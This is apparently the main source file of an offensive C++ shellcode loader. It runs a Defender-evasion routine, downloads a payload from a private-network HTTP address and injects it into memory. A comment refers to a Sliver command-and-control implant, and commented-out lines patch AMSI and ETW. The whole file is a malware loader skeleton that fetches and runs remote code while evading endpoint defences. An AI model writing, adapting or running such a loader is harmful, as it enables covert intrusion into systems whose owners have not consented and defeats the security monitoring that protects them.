#include "Bypass.h"
#include "Inject.h"
#include "Download.h"
#include "util.h"

int main() {
	DefenderEmulator();

	Bypass bypass;
	Inject injector;
	Download downloader;
	std::vector<char> payload;

	//bypass.PatchAMSI();
	
	// Sliver bin.http://192.168.152.134/INNOVATIVE_LEADER.bin
	payload = downloader.DownloadFile("http://10.10.14.24/test.bin");
	//payload = downloader.DownloadFile("http://192.168.152.135:80/test.bin");
	//bypass.PatchETW();
	injector.injection(payload);
}


